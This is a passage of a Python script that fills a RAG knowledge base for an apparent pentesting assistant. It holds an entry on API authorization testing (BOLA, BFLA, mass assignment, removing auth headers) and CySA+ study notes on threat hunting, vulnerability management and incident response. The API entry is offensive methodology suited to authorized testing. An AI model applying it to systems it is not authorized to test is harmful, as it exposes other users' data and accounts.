  program cap, confirm each candidate with a clean repro before reporting.
""", ["request-analysis", "idor", "bola", "parameter-discovery", "verb-tampering", "cors", "methodology", "api"], "api")

# -------- API authorization (OWASP API Top 10) --------
_kb("""
API AUTHORIZATION — BOLA / BFLA / BOPLA (OWASP API Security Top 10)

BOLA (API1, object level = IDOR on APIs):
  Every request referencing an object id -> test from account B.
  /api/orders/{id}  /api/users/{id}/card  /files/{uuid}
  GraphQL node(id:) and nested REST (/tenants/{t}/users/{u}).
  Sources of ids: sequential, UUID swap, leaked in JS/another response,
  id-in-JWT vs id-in-path mismatch.

BFLA (API5, function level):
  Low-priv user invokes an admin/privileged FUNCTION.
  POST /api/admin/*, DELETE /api/users/{id}, role-change / impersonate.
  Find admin routes in the JS bundle -> call them as a normal user; also
  swap GET->POST/PUT on read endpoints.

BOPLA / mass assignment (API3, property level):
  Read side: response returns MORE fields than the UI shows (internal flags,
    other users' PII) -> excessive data exposure.
  Write side: PATCH accepts fields the UI never sends (role, balance,
    is_verified, org_id) -> property-level escalation.

Broken auth (API2):
  Remove Authorization entirely on EACH endpoint — many APIs only enforce it
  on the obvious routes. Test refresh/logout/2fa/export endpoints too.

Method: build a 2-account matrix (A attacker, B victim, plus anon). Replay
  each request as each identity; a 200 where 403 is expected is the bug.
  Automate the swap with Burp Autorize / AuthMatrix, then hand-confirm.
Impact: BOLA/BFLA over financial or PII objects = High -> Critical.
""", ["api", "bola", "bfla", "bopla", "mass-assignment", "owasp-api", "authorization", "idor"], "api")

# -------- CySA+ concepts --------
CYSA_KB: list[tuple[str, dict]] = []

def _cysa(text: str, topics: list[str]):
    CYSA_KB.append((text.strip(), {
        "type":     "cysa_kb",
        "category": "cysa",
        "tags":     ",".join(topics),
    }))

_cysa("""
CySA+ — Threat Intelligence & Hunting

TAXII / STIX: Structured Threat Information Expression — interoperability for CTI
  STIX objects: Indicators, TTPs, Campaigns, Threat Actors, Course of Action
  TAXII servers: push/pull CTI feeds between organizations

Threat hunting methodologies:
  Hypothesis-driven: start with an assumption based on CTI → hunt for evidence
  IOC-driven: known bad IPs, hashes, domains → scan logs
  TTP-driven: look for behavior patterns (ATT&CK techniques) not just IOCs
  Anomaly-driven: ML baselines → detect deviations

Diamond Model:
  Adversary ↔ Infrastructure ↔ Capability ↔ Victim
  Used to understand attack relationships and pivot for attribution

Kill Chain (Lockheed Martin):
  Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions on Objectives
  Defenders: detect early (recon/deliver) to prevent later stages

IOC types by reliability (decreasing):
  Hash > IP > Domain > Network artifacts > Host artifacts > Tools > TTPs (hardest to change)
""", ["threat-intel", "stix", "taxii", "diamond-model", "kill-chain", "hunting"])

_cysa("""
CySA+ — Vulnerability Management Lifecycle

1. Scan (authenticated > unauthenticated)
   Nessus, Qualys, Rapid7 Nexpose, OpenVAS
2. Prioritize (CVSS + EPSS + asset criticality + exposure)
   EPSS: Exploit Prediction Scoring System (probability of exploitation in 30 days)
   CVSS v3.1: Base + Temporal + Environmental
3. Remediate: Patch → mitigate → accept → transfer risk
4. Verify: Re-scan to confirm fix
5. Report: Metrics — MTTR (Mean Time to Remediate), risk score trend

Key concepts:
  False positive: finding flagged but not real → validate manually
  False negative: real vuln missed by scanner → use multiple tools
  Risk acceptance: document, get sign-off, set review date
  Compensating control: alternative control when primary can't be applied
""", ["vuln-management", "cvss", "epss", "patch", "risk", "nessus"])

_cysa("""
CySA+ — Incident Response

IR Phases (NIST SP 800-61r2):
  1. Preparation
  2. Detection & Analysis
  3. Containment, Eradication & Recovery
  4. Post-Incident Activity

Chain of Custody: document who touched evidence, when, where
Forensic integrity: hash evidence before and after (MD5/SHA-256)
Memory forensics: Volatility, LiME (Linux Memory Extractor)
Disk forensics: Autopsy, FTK, dd for imaging

Log sources for detection:
  SIEM: aggregate + correlate (Splunk, Elastic SIEM, QRadar)
  EDR: endpoint telemetry (CrowdStrike, SentinelOne, Carbon Black)
  NDR: network flow (Zeek/Bro, Suricata, Darktrace)
  UEBA: user behavior baseline + anomaly

Artifact types:
  IOC categories: file hashes, IPs, domains, URLs, email addresses, registry keys
  Artifacts of compromise: prefetch files, LNK files, MFT entries, shellbags, Amcache
""", ["incident-response", "forensics", "siem", "edr", "ir", "memory", "nist"])

_cysa("""
CySA+ — Security Operations & MITRE ATT&CK

ATT&CK Navigator: visualize coverage, gaps, and detection logic
Detection analytics:
  - Sigma rules: portable SIEM detection rules (YAML)
  - YARA: malware pattern matching
  - Snort/Suricata: network detection rules

D3FEND framework (NSA/MITRE):
  Maps defensive techniques → counteracts ATT&CK offensives
  Technique families: Harden, Detect, Isolate, Deceive, Evict

SOAR (Security Orchestration, Automation, Response):
  Playbook automation for common incidents
  Integrate SIEM + ticketing + threat intel feeds
  Reduce analyst fatigue, speed MTTR

Purple teaming:
  Red team TTPs → Blue team detection gaps → close the loop
  ATT&CK as common language between red and blue

Threat actors classification:
  Nation-state: high sophistication, APT (Advanced Persistent Threat)
  Organized crime: financially motivated, ransomware, BEC
  Hacktivist: politically motivated, DDoS, defacement
  Insider: malicious vs negligent
  Script kiddie: low skill, using existing tools
""", ["soar", "siem", "purple-team", "sigma", "yara", "detection", "att&ck"])

# ------------------------------------------------------------------ #
# Main ingest                                                          #
# ------------------------------------------------------------------ #

def ingest_knowledge(rag=None):
    from rag.store import get_rag
    r = rag or get_rag()

    print(f"  Upserting {len(PENTEST_KB)} pentest KB records …")
    r.upsert_batch("pentest_kb", PENTEST_KB)

    print(f"  Upserting {len(CYSA_KB)} CySA+ records …")
    r.upsert_batch("cysa_kb", CYSA_KB)

    print("  Knowledge base ingested.")


if __name__ == "__main__":
    sys.path.insert(0, str(RAG_DIR.parent))
    ingest_knowledge()
    print("Done.")
